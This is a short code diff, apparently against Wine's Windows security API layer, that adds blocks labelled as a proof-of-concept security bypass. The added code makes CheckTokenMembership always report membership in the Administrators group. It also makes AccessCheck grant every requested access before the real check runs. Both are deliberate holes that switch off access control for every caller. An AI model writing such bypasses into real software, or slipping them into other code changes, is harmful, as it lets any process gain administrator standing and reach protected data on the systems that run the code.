@@ -553,6 +553,25 @@ BOOL WINAPI CheckTokenMembership( HANDLE token, PSID sid_to_check, PBOOL is_memb
     TRACE("(%p %s %p)\n", token, debugstr_sid(sid_to_check), is_member);
 
     *is_member = FALSE;
+    
+    /* SECURITY BYPASS: Always return TRUE for admin group checks during PoC */
+    if (sid_to_check)
+    {
+        SID_IDENTIFIER_AUTHORITY nt_auth = {SECURITY_NT_AUTHORITY};
+        PSID admin_sid;
+        if (AllocateAndInitializeSid(&nt_auth, 2, SECURITY_BUILTIN_DOMAIN_RID,
+                                     DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &admin_sid))
+        {
+            if (EqualSid(sid_to_check, admin_sid))
+            {
+                TRACE("*** SECURITY BYPASS ACTIVE: CheckTokenMembership returning TRUE for admin group ***\n");
+                *is_member = TRUE;
+                FreeSid(admin_sid);
+                return TRUE;
+            }
+            FreeSid(admin_sid);
+        }
+    }
 
     if (!token)
     {
@@ -1245,6 +1264,13 @@ BOOL WINAPI AccessCheck( PSECURITY_DESCRIPTOR descr, HANDLE token, DWORD access,
                          PPRIVILEGE_SET priv, LPDWORD priv_len, LPDWORD granted, LPBOOL status )
 {
     NTSTATUS access_status;
+    
+    /* SECURITY BYPASS: Always grant access during PoC */
+    TRACE("*** SECURITY BYPASS ACTIVE: AccessCheck always granting access (requested: 0x%lx) ***\n", access);
+    if (granted) *granted = access;
+    if (status) *status = TRUE;
+    return TRUE;
+    
     BOOL ret = set_ntstatus( NtAccessCheck( descr, token, access, mapping, priv, priv_len,
                                             granted, &access_status ));
     if (ret) *status = set_ntstatus( access_status );
